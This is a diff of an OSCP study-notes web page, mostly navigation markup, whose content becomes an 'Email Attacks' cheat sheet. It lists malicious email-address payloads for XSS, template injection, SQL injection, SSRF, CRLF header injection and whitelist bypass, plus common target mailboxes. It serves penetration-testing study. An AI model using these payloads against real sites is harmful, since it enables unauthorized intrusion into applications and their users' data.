@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://an4kein.github.io/oscp-notes/enumeration/web_attacks/header_injection/">
+        <link rel="canonical" href="https://an4kein.github.io/oscp-notes/enumeration/web_attacks/email-attacks/">
       
       
-        <link rel="prev" href="../quick_tricks/">
+        <link rel="prev" href="../dns-rebinding/">
       
       
-        <link rel="next" href="../../../exploitation/payloads/">
+        <link rel="next" href="../header-injections/">
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
@@ -22,7 +22,7 @@
     
     
       
-        <title>Header Injection - OSCP Notes</title>
+        <title>Email Attacks - OSCP Notes</title>
       
     
     
@@ -73,6 +73,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#email-attacks" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -103,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Header Injection
+              Email Attacks
             
           </span>
         </div>
@@ -499,6 +504,80 @@
     
       
         
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
       
         
       
@@ -522,8 +601,10 @@
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
         
           
-          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="">
-            
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
   
   <span class="md-ellipsis">
     Web Attacks
@@ -531,8 +612,14 @@
   </span>
   
 
-            <span class="md-nav__icon md-icon"></span>
-          </label>
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
         
         <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_4">
@@ -542,13 +629,15 @@
           <ul class="md-nav__list" data-md-scrollfix>
             
               
+            
+              
                 
   
   
   
   
     <li class="md-nav__item">
-      <a href="../general_info/" class="md-nav__link">
+      <a href="../general-info/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -570,11 +659,363 @@
   
   
     <li class="md-nav__item">
-      <a href="../quick_tricks/" class="md-nav__link">
+      <a href="../quick-tricks/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
     Quick Tricks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirects
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../broken-links/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Broken Links
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../parameter-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Parameter Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bruteforcing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bruteforcing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pastejacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pastejacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../clickjacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Clickjacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../prototype-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Prototype Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../command-injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cookie-padding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cookie Padding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cors/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CORS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crawl-fuzz/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Crawl & Fuzz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crlf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CRLF Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSP (Content Security Policy)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSRF (Cross-Site Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../deserialization/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deserialization Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dns-rebinding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS Rebinding
     
   </span>
   
@@ -598,18 +1039,438 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
-    Header Injection
+    Email Attacks
     
   </span>
   
 
       </a>
       
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../header-injections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Header Injections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR (Insecure Direct Object References)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lfi-rfi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LFI & RFI (Local & Remote File Inclusion)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../online-hashes-cracked/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Online Hashes Cracked
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirect/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirect
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../request-smuggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Request Smuggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../session-fixation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Session Fixation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection (SQLi)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF (Server-Side Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSTI (Server-Side Template Injection)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tabnabbing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tabnabbing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../upload-bypasses/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Bypasses
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vhosts/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Virtual Hosts Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-deception/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Deception
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-poisoning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Poisoning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-sockets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Sockets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XSS (Cross-Site Scripting)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE (XML External Entity)
+    
+  </span>
+  
+
+      </a>
     </li>
   
 
@@ -1042,9 +1903,74 @@
   
 
 
-  <h1>Header Injection</h1>
+<h1 id="email-attacks">Email attacks</h1>
+<table>
+<thead>
+<tr>
+<th>Attack</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XSS</td>
+<td><p>test+(alert(0))@example.com</p><p>test@example(alert(0)).com</p><p>"alert(0)"@example.com</p><p>&#x3C;script src=//xsshere?”@email.com</p></td>
+</tr>
+<tr>
+<td>Template injection</td>
+<td><p>"&#x3C;%= 7 * 7 %&gt;"@example.com</p><p> test+(${{7*7}})@example.com</p></td>
+</tr>
+<tr>
+<td>SQLi</td>
+<td><p>"' OR 1=1 -- '"@example.com </p><p>"mail'); SELECT version();--"@example.com</p><p>a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1\"@a.com</p></td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td><p>john.doe@abc123.burpcollaborator.net</p><p>john.doe@[127.0.0.1]</p></td>
+</tr>
+<tr>
+<td>Parameter Pollution</td>
+<td>victim\&amp;email=attacker@example.com</td>
+</tr>
+<tr>
+<td>(Email) Header Injection</td>
+<td><p>"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com</p><p>"recipient@test.com&gt;\r\nRCPT TO:&#x3C;victim+"@test.com</p></td>
+</tr>
+<tr>
+<td>Wildcard abuse</td>
+<td>%@example.com</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code># Bypass whitelist
+inti(;inti@inti.io;)@whitelisted.com
+inti@inti.io(@whitelisted.com)
+inti+(@whitelisted.com;)@inti.io
 
+#HTML Injection in Gmail
+inti.de.ceukelaire+(&lt;b&gt;bold&lt;u&gt;underline&lt;s&gt;strike&lt;br/&gt;newline&lt;strong&gt;strong&lt;sup&gt;sup&lt;sub&gt;sub)@gmail.com
 
+# Bypass strict validators
+# Login with SSO &amp; integrations
+GitHub &amp; Salesforce allow xss in email, create account and abuse with login integration
+
+# Common email accounts
+support@
+jira@
+print@
+feedback@
+asana@
+slack@
+hello@
+bug(s)@
+upload@
+service@
+it@
+test@
+help@
+tickets@
+tweet@
+</code></pre></div>
 
 
 
